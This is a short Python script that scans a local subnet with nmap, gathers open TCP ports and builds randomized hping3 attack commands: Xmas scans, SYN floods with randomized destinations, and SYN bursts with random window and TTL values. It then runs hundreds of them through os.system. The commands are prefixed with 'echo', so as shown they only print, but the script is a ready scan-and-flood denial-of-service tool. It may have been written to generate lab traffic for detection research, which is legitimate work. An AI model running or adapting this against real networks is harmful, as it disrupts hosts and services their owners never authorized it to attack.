#!/usr/bin/python3
import os
import random
import nmap

#DST_NETWORK='172.16.1.'
NATTACKS=1000
DST_NETWORK='192.168.1'
IF_NAME='enp7s0'
ATK_MIN=1
ATK_MAX=10000
ATK_WIN_MIN=512
ATK_WIN_MAX=65536
TTL_MIN=1
TTL_MAX=50

ATK_PORTS=set()

cmds = [ 'echo hping3 --xmas',\
       ]

def scan():
    nm = nmap.PortScanner()
    nm.scan(DST_NETWORK+'.0/24',arguments='-n -sP')
    hosts_list = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]
    for host, status in hosts_list:
        print(host + ' ' + status)
        nm.scan(host, arguments='-n -sT')
        if 'tcp' in nm[host]:
            for key in nm[host]['tcp'].keys():
                ATK_PORTS.add(key) #convert to set
                print(ATK_PORTS)

def gera_ataques():
   for port in ATK_PORTS:
       cmds.append('echo hping3 -S --flood -p '+str(port)+' '+DST_NETWORK+'.x --rand-dest -I '+IF_NAME)
       cmds.append('echo hping3 -c '+str(random.randint(ATK_MIN,ATK_MAX))+' -S -p '+ str(port) +' --win '+str(random.randint(ATK_WIN_MIN,ATK_WIN_MAX))+' --ttl '+str(random.randint(TTL_MIN,TTL_MAX))+' '+DST_NETWORK+'.x --rand-dest -I '+IF_NAME)

def ataca():
    for id in range(1,NATTACKS):
        attack=cmds[random.randint(0,len(cmds)-1)]
        print('Executando ataque número {} comando {}'.format(id,attack ))
        os.system(attack)

scan()
gera_ataques()
#while True:
ataca()


